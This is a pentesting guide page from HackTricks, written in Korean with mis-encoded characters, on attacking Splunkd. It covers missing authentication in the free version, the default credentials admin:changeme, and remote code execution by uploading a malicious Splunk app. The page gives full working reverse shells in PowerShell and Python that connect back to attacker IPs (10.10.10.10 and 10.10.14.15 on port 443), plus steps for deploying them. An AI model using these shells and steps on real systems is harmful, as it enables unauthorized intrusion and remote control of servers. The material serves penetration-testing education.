# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## **ê¸°ë³¸ ì •ë³´**

* ë°ì´í„° ìˆ˜ì§‘, ë¶„ì„ ë° ì‹œê°í™”ë¥¼ ìœ„í•œ ë¡œê·¸ ë¶„ì„ ë„êµ¬
* ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ ë° ë¹„ì¦ˆë‹ˆìŠ¤ ë¶„ì„ì— ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë¨
* ê¸°ë³¸ í¬íŠ¸:
* ì›¹ ì„œë²„: 8000
* Splunkd ì„œë¹„ìŠ¤: 8089

### ì·¨ì•½ì  ë²¡í„°:

1. ë¬´ë£Œ ë²„ì „ ì•…ìš©

* í‰ê°€íŒ ë²„ì „ì€ 60ì¼ í›„ ìë™ìœ¼ë¡œ ë¬´ë£Œ ë²„ì „ìœ¼ë¡œ ì „í™˜ë¨
* ë¬´ë£Œ ë²„ì „ì€ ì¸ì¦ì´ ì—†ìŒ
* ê´€ë¦¬ë˜ì§€ ì•Šì„ ê²½ìš° ì ì¬ì ì¸ ë³´ì•ˆ ìœ„í—˜
* ê´€ë¦¬ìê°€ ë³´ì•ˆ ë¬¸ì œë¥¼ ê°„ê³¼í•  ìˆ˜ ìˆìŒ

2. ìê²© ì¦ëª… ì•½ì 

* ì´ì „ ë²„ì „: ê¸°ë³¸ ìê²© ì¦ëª… `admin:changeme`
* ìµœì‹  ë²„ì „: ì„¤ì¹˜ ì¤‘ ì„¤ì •ëœ ìê²© ì¦ëª…
* ì•½í•œ ë¹„ë°€ë²ˆí˜¸ ì‚¬ìš© ê°€ëŠ¥ì„± (ì˜ˆ: `admin`, `Welcome`, `Password123`)

3. ì›ê²© ì½”ë“œ ì‹¤í–‰ ê¸°íšŒ

* ì—¬ëŸ¬ ì½”ë“œ ì‹¤í–‰ ë°©ë²•:
* ì„œë²„ ì¸¡ Django ì• í”Œë¦¬ì¼€ì´ì…˜
* REST ì—”ë“œí¬ì¸íŠ¸
* ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥
* ê²½ê³  ìŠ¤í¬ë¦½íŠ¸
* í¬ë¡œìŠ¤ í”Œë«í¼ ì§€ì› (Windows/Linux)
* ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ì€ ë‹¤ìŒì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŒ:
* Bash ìŠ¤í¬ë¦½íŠ¸
* PowerShell ìŠ¤í¬ë¦½íŠ¸
* ë°°ì¹˜ ìŠ¤í¬ë¦½íŠ¸

ì£¼ìš” ì•…ìš© ê°€ëŠ¥ì„±:

* ë¯¼ê°í•œ ë°ì´í„° ì €ì¥
* ë¬´ë£Œ ë²„ì „ì˜ ì¸ì¦ ë¶€ì¡±
* ì ì¬ì ì¸ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ìœ„í•œ ì—¬ëŸ¬ ë²¡í„°
* ì‹œìŠ¤í…œ ì†ìƒì„ ìœ„í•œ ìŠ¤í¬ë¦½íŠ¸ ì…ë ¥ í™œìš© ê°€ëŠ¥ì„±

### Shodan

* `Splunk build`

## RCE

### ì‚¬ìš©ì ì •ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ ìƒì„±

SplunkëŠ” ì‚¬ìš©ì ì •ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°°í¬ë¥¼ í†µí•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ìœ„í•œ ì •êµí•œ ë°©ë²•ì„ ì œê³µí•˜ë©°, í¬ë¡œìŠ¤ í”Œë«í¼ ìŠ¤í¬ë¦½íŒ… ê¸°ëŠ¥ì„ í™œìš©í•©ë‹ˆë‹¤. í•µì‹¬ ì•…ìš© ê¸°ìˆ ì€ Windows ë° Linux ì‹œìŠ¤í…œì—ì„œ ë¦¬ë²„ìŠ¤ ì…¸ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì•…ì„± ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤.

ì‚¬ìš©ì ì •ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ **Python, Batch, Bash ë˜ëŠ” PowerShell ìŠ¤í¬ë¦½íŠ¸**ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, **Splunkì—ëŠ” Pythonì´ ì„¤ì¹˜ë˜ì–´ ìˆìœ¼ë¯€ë¡œ**, **Windows** ì‹œìŠ¤í…œì—ì„œë„ Python ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì´ ì˜ˆì œ**](https://github.com/0xjpuff/reverse_shell_splunk)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, **`bin`**ì—ëŠ” [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) ë° [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1) ì˜ˆì œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” ìì‹ ë§Œì˜ ê²ƒì„ ë§Œë“¤ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ì•…ìš© ê³¼ì •ì€ í”Œë«í¼ ì „ë°˜ì— ê±¸ì³ ì¼ê´€ëœ ë°©ë²•ë¡ ì„ ë”°ë¦…ë‹ˆë‹¤:
```
splunk_shell/
â”œâ”€â”€ bin        (reverse shell scripts)
â””â”€â”€ default    (inputs.conf configuration)
```
ì¤‘ìš”í•œ êµ¬ì„± íŒŒì¼ `inputs.conf`ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ í™œì„±í™”í•©ë‹ˆë‹¤:

* `disabled = 0` ì„¤ì •
* 10ì´ˆ ì‹¤í–‰ ê°„ê²© êµ¬ì„±
* ìŠ¤í¬ë¦½íŠ¸ì˜ ì†ŒìŠ¤ ìœ í˜• ì •ì˜

ë°°í¬ëŠ” ê°„ë‹¨í•©ë‹ˆë‹¤:

1. ì•…ì„± ì• í”Œë¦¬ì¼€ì´ì…˜ íŒ¨í‚¤ì§€ ìƒì„±
2. ê³µê²© ë¨¸ì‹ ì—ì„œ ë¦¬ìŠ¤ë„ˆ(Netcat/socat) ì„¤ì •
3. Splunkì˜ ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ ì• í”Œë¦¬ì¼€ì´ì…˜ ì—…ë¡œë“œ
4. ì—…ë¡œë“œ ì‹œ ìë™ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ íŠ¸ë¦¬ê±°

ìƒ˜í”Œ Windows PowerShell ë¦¬ë²„ìŠ¤ ì…¸:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
ìƒ˜í”Œ ë¦¬ëˆ…ìŠ¤ íŒŒì´ì¬ ë¦¬ë²„ìŠ¤ ì…¸:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” ì´ ì„œë¹„ìŠ¤ë¥¼ ì•…ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¤ê³  ì§€ì†ì„±ì„ í™•ë³´í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì„¤ëª…ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
